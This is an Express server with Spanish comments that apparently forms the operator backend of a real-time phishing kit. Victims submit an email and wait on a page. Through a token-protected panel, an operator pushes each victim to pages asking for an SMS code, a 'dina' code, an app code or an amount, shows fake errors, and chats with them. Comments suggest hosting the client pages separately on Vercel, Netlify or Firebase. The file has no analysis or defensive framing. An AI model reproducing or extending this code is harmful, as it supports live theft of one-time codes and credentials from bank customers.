// Servidor: solicitudes + eventos en tiempo real (SSE, sin librerías extra)
const express = require('express');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'cambia-este-token';

// CORS abierto (*) para que el cliente pueda estar en otro host
app.use((req, res, next) => {
  res.set({
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET,POST,DELETE,OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, x-admin-token',
  });
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.use(express.json({ limit: '20kb' }));
// El panel de admin se sirve desde este servidor (/panel.html). El cliente va aparte (carpeta /cliente)
app.use(express.static(path.join(__dirname, 'admin')));
// Opcional: si no se despliega aparte, también puede servirse desde aquí con SERVIR_CLIENTE=1
if (process.env.SERVIR_CLIENTE) app.use(express.static(path.join(__dirname, 'cliente')));

// En memoria. En producción, cámbialo por una base de datos (Postgres, Mongo, etc.)
const solicitudes = new Map();   // id -> solicitud
const clientes = new Map();      // id -> Set de conexiones SSE del cliente
const paneles = new Set();       // conexiones SSE del panel

const limpiar = (s, max = 500) => String(s ?? '').trim().slice(0, max);

function abrirSSE(req, res) {
  res.set({
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    Connection: 'keep-alive',
    'X-Accel-Buffering': 'no',
  });
  res.flushHeaders();
  const latido = setInterval(() => res.write(': latido\n\n'), 25000);
  req.on('close', () => clearInterval(latido));
}
const enviar = (res, evento, datos) =>
  res.write(`event: ${evento}\ndata: ${JSON.stringify(datos)}\n\n`);

const aCliente = (id, evento, datos) =>
  (clientes.get(id) || new Set()).forEach((r) => enviar(r, evento, datos));
const aPanel = (evento, datos) => paneles.forEach((r) => enviar(r, evento, datos));

function auth(req, res, next) {
  // EventSource no permite cabeceras, por eso también se acepta ?token=
  const t = req.get('x-admin-token') || req.query.token || '';
  const a = Buffer.from(String(t)), b = Buffer.from(ADMIN_TOKEN);
  if (a.length !== b.length || !crypto.timingSafeEqual(a, b))
    return res.status(401).json({ error: 'no autorizado' });
  next();
}

// ---------- CLIENTE ----------

// Rutas de destino: son relativas, así que el navegador las resuelve contra el host
// donde esté alojado el cliente (Vercel, Netlify, Firebase, etc.). Se pueden sobrescribir con URL_*.
const URLS = {
  sms: process.env.URL_SMS || '/code.html',
  dina: process.env.URL_DINA || '/codedina.html',
  codeapp: process.env.URL_CODEAPP || '/codeapp.html',
  monto: process.env.URL_MONTO || '/codemon.html',
  error: process.env.URL_ERROR || '/',
};

const idDe = (email) => limpiar(email, 150).toLowerCase();
const estadoChat = (s) => ({ chatAbierto: s.chatAbierto, puedeEscribir: s.puedeEscribir, mensajes: s.mensajes });

// 1) El formulario crea (o recupera) la solicitud: solo email
app.post('/api/solicitudes', (req, res) => {
  const email = idDe(req.body.email);
  if (!email || !/^\S+@\S+\.\S+$/.test(email)) return res.status(400).json({ error: 'Email inválido' });

  if (!solicitudes.has(email)) {
    const sol = { id: email, email, chatAbierto: false, puedeEscribir: false, mensajes: [], creada: Date.now() };
    solicitudes.set(email, sol);
    aPanel('nueva', sol);
  }
  res.status(201).json({ email });
});

// 2) La página de espera escucha los eventos de SU email
app.get('/api/eventos/:id', (req, res) => {
  const sol = solicitudes.get(idDe(req.params.id));
  if (!sol) return res.status(404).end();
  abrirSSE(req, res);

  if (!clientes.has(sol.id)) clientes.set(sol.id, new Set());
  clientes.get(sol.id).add(res);
  enviar(res, 'chat', estadoChat(sol));

  req.on('close', () => clientes.get(sol.id)?.delete(res));
});

// 3) El cliente escribe en el chat (solo si el admin lo permitió)
app.post('/api/chat/:id', (req, res) => {
  const sol = solicitudes.get(idDe(req.params.id));
  if (!sol) return res.status(404).json({ error: 'No existe' });
  if (!sol.chatAbierto || !sol.puedeEscribir) return res.status(403).json({ error: 'No permitido' });
  const texto = limpiar(req.body.texto, 500);
  if (!texto) return res.status(400).json({ error: 'Mensaje vacío' });
  const m = { de: 'usuario', texto, fecha: Date.now() };
  sol.mensajes.push(m);
  aCliente(sol.id, 'mensaje', m);
  aPanel('actualizada', sol);
  res.json({ ok: true });
});

// ---------- PANEL (protegido) ----------

app.get('/api/panel/solicitudes', auth, (req, res) =>
  res.json([...solicitudes.values()].sort((a, b) => b.creada - a.creada)));

app.get('/api/panel/eventos', auth, (req, res) => {
  abrirSSE(req, res);
  paneles.add(res);
  req.on('close', () => paneles.delete(res));
});

// Eliminar solicitud
app.delete('/api/panel/solicitudes/:id', auth, (req, res) => {
  const id = idDe(req.params.id);
  if (!solicitudes.delete(id)) return res.status(404).json({ error: 'No existe' });
  aCliente(id, 'eliminada', {});
  clientes.delete(id);
  aPanel('eliminada', { id });
  res.json({ ok: true });
});

// Acciones: sms | codeapp | monto | error | mensaje (abrir chat) | chat (responder) | permiso
app.post('/api/panel/solicitudes/:id/accion', auth, (req, res) => {
  const sol = solicitudes.get(idDe(req.params.id));
  if (!sol) return res.status(404).json({ error: 'No existe' });
  const { accion } = req.body;

  if (['sms', 'dina', 'codeapp', 'monto'].includes(accion)) {
    aCliente(sol.id, 'accion', { tipo: accion, url: URLS[accion] });
  } else if (accion === 'error') {
    const texto = limpiar(req.body.texto, 300) || 'Ha ocurrido un error';
    aCliente(sol.id, 'accion', { tipo: 'error', texto, url: URLS.error, segundos: 5 });
  } else if (accion === 'mensaje') {
    // Abre el modal CHAT CON ADMIN; el admin decide si el usuario puede escribir
    sol.chatAbierto = true;
    sol.puedeEscribir = !!req.body.puedeEscribir;
    aCliente(sol.id, 'chat', estadoChat(sol));
  } else if (accion === 'permiso') {
    sol.puedeEscribir = !!req.body.puedeEscribir;
    aCliente(sol.id, 'chat', estadoChat(sol));
  } else if (accion === 'cerrarchat') {
    sol.chatAbierto = false;
    aCliente(sol.id, 'chat', estadoChat(sol));
  } else if (accion === 'chat') {
    const texto = limpiar(req.body.texto, 500);
    if (!texto) return res.status(400).json({ error: 'Mensaje vacío' });
    const m = { de: 'admin', texto, fecha: Date.now() };
    sol.mensajes.push(m);
    aCliente(sol.id, 'mensaje', m);
  } else {
    return res.status(400).json({ error: 'Acción desconocida' });
  }
  aPanel('actualizada', sol);
  res.json(sol);
});

app.listen(PORT, () => console.log(`http://localhost:${PORT}  (panel: /panel.html)`));
